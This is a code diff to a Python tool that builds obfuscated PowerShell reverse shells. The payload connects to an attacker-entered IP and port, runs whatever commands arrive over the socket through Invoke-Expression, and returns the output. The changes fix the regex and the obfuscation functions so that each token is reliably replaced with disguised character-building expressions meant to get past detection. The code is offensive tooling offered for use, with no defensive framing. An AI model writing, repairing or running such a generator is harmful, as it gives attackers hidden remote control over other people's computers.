@@ -4,9 +4,9 @@ import string
 import os
 
 # PAYLOAD AND PATTERN
-reverse_shell = """$ReverseShellConnection = (& (\New-Object\) (\System.Net.Sockets.TCPClient\)(((\IP_ADDRESS\), (\PORT\))));$NetworkStream = $ReverseShellConnection.(\GetStream\)();$ReadBuffer = (& (\New-Object\) Byte[] 65536);while (($BytesRead = $NetworkStream.(\Read\)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (\Invoke-Expression\) $CommandOutput 2>&1) | & (\Out-String\);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(\GetBytes\)($PromptWithOutput));$NetworkStream.(\Write\)($OutputBytes, 0, $OutputBytes.(\Length\));$NetworkStream.(\Flush\)();}$ReverseShellConnection.(\Close\)()"""
+reverse_shell = r"$ReverseShellConnection = (& (\New-Object\) (\System.Net.Sockets.TCPClient\)(((\IP_ADDRESS\), (\PORT\))));$NetworkStream = $ReverseShellConnection.(\GetStream\)();$ReadBuffer = (& (\New-Object\) Byte[] 65536);while (($BytesRead = $NetworkStream.(\Read\)($ReadBuffer, 0, $ReadBuffer.(\Length\))) -ne 0) {;$CommandOutput = (& (\Invoke-Expression\) (\[System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)\));$ExecutedOutput = (& (\Invoke-Expression\) $CommandOutput 2>&1) | & (\Out-String\);$PromptWithOutput = $ExecutedOutput + (\PS > \);$OutputBytes = (& (\Invoke-Expression\) (\[text.encoding]::ASCII.GetBytes($PromptWithOutput)\));$NetworkStream.(\Write\)($OutputBytes, 0, $OutputBytes.(\Length\));$NetworkStream.(\Flush\)();}$ReverseShellConnection.(\Close\)()"
 
-pattern = r"\\.+\\"
+pattern = r"\\.+?\\"
 
 # REPLACE IP/PORT
 ip_address = input("Enter IP: ")
@@ -77,7 +77,7 @@ def random_string_2_string(object):
         if char_positions[i] == '':
             char_positions[i] = random.choice(string.ascii_letters + string.digits)
 		
-    return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_}"
+    return "('" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_})"
 
 # METHOD 4
 env = [
@@ -121,14 +121,13 @@ def environment_variables_2_string(object):
             chosen_index = random.choice(possible_index)
             hidden_strings.append(f"$env:{chosen_variable}[{chosen_index}]")
         else:
-            random.choice([list_2_character_2_string,
-                           character_2_string,
-                           random_string_2_string])(character)
+            hidden_strings.append(random.choice([list_2_character_2_string,
+                                  character_2_string,
+                                  random_string_2_string])(character))
     return "+".join(hidden_strings)
 
 # REPLACE EACH MATCH WITH RANDOM METHOD
-for match in range(int(reverse_shell.count("/")/2)):
-    print(reverse_shell + "\n")
+for match in range(int(reverse_shell.count("\\")/2)):
     reverse_shell = re.sub(pattern,
                            lambda m: random.choice([list_2_character_2_string,
                                                     character_2_string,
